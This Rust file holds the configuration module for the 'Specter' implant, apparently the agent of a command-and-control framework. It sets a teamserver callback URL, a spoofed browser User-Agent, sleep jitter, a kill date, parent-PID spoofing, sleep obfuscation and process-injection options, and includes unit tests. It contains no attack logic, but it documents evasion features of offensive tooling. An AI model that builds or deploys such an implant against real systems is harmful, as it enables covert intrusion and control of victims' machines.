//! Agent configuration for the Specter implant.

use crate::error::SpecterError;

/// Configuration for the Specter agent.
#[derive(Debug, Clone)]
pub struct SpecterConfig {
    /// Teamserver callback URL (e.g. `https://10.0.0.1:443/callback`).
    pub callback_url: String,
    /// Optional HKDF init secret matching the listener's `init_secret` setting.
    pub init_secret: Option<String>,
    /// PEM-encoded certificate to pin for TLS connections to the teamserver.
    ///
    /// When set, only the teamserver presenting this certificate (or one signed by it) is
    /// trusted. When `None`, the system CA store is used instead.  Baked in at compile time
    /// via the `SPECTER_PINNED_CERT_PEM` environment variable.
    pub pinned_cert_pem: Option<String>,
    /// User-Agent string sent in HTTP callbacks.
    pub user_agent: String,
    /// Sleep delay between callbacks in milliseconds.
    pub sleep_delay_ms: u32,
    /// Jitter percentage (0–100) applied to the sleep delay.
    pub sleep_jitter: u32,
    /// Optional kill date as a Unix timestamp.  The agent exits after this time.
    pub kill_date: Option<i64>,
    /// Optional working-hours bitmask.
    pub working_hours: Option<i32>,
    /// Spoofed parent PID for child process creation (set by `CommandProcPpidSpoof`).
    pub ppid_spoof: Option<u32>,
    /// Verbose output flag (set by `CommandConfig` / `ImplantVerbose`).
    pub verbose: bool,
    /// Sleep obfuscation technique identifier.
    pub sleep_technique: u32,
    /// Whether COFF execution uses a dedicated thread.
    pub coffee_threaded: bool,
    /// Whether COFF execution uses a Vectored Exception Handler.
    pub coffee_veh: bool,
    /// Default memory allocation technique identifier.
    pub memory_alloc: u32,
    /// Default memory execution technique identifier.
    pub memory_execute: u32,
    /// Default process injection technique identifier.
    pub inject_technique: u32,
    /// Sleep-obfuscation spoof thread start address: `(library, function, offset)`.
    pub spf_thread_addr: Option<(String, String, u32)>,
    /// Injection spoof address: `(library, function, offset)`.
    pub inject_spoof_addr: Option<(String, String, u32)>,
    /// Default 64-bit spawn process path for injection.
    pub spawn64: Option<String>,
    /// Default 32-bit spawn process path for injection.
    pub spawn32: Option<String>,
}

impl SpecterConfig {
    /// Validate the configuration, returning an error if any field is invalid.
    pub fn validate(&self) -> Result<(), SpecterError> {
        if self.callback_url.is_empty() {
            return Err(SpecterError::InvalidConfig("callback_url must not be empty"));
        }
        if matches!(self.init_secret.as_deref(), Some("")) {
            return Err(SpecterError::InvalidConfig("init_secret must not be empty"));
        }
        if self.sleep_jitter > 100 {
            return Err(SpecterError::InvalidConfig("sleep_jitter must be 0–100"));
        }
        Ok(())
    }
}

impl Default for SpecterConfig {
    fn default() -> Self {
        Self {
            callback_url: String::from("https://127.0.0.1:40056/"),
            init_secret: None,
            // Baked in at compile time — set SPECTER_PINNED_CERT_PEM when building the implant.
            pinned_cert_pem: option_env!("SPECTER_PINNED_CERT_PEM").map(str::to_string),
            user_agent: String::from(
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
            ),
            sleep_delay_ms: 5000,
            sleep_jitter: 0,
            kill_date: None,
            working_hours: None,
            ppid_spoof: None,
            verbose: false,
            sleep_technique: 0,
            coffee_threaded: false,
            coffee_veh: false,
            memory_alloc: 0,
            memory_execute: 0,
            inject_technique: 0,
            spf_thread_addr: None,
            inject_spoof_addr: None,
            spawn64: None,
            spawn32: None,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn default_config_is_valid() {
        let config = SpecterConfig::default();
        assert!(config.validate().is_ok());
    }

    #[test]
    fn empty_callback_url_is_invalid() {
        let config = SpecterConfig { callback_url: String::new(), ..Default::default() };
        assert!(config.validate().is_err());
    }

    #[test]
    fn jitter_over_100_is_invalid() {
        let config = SpecterConfig { sleep_jitter: 101, ..Default::default() };
        assert!(config.validate().is_err());
    }

    #[test]
    fn empty_init_secret_is_invalid() {
        let config = SpecterConfig { init_secret: Some(String::new()), ..Default::default() };
        assert!(config.validate().is_err());
    }
}
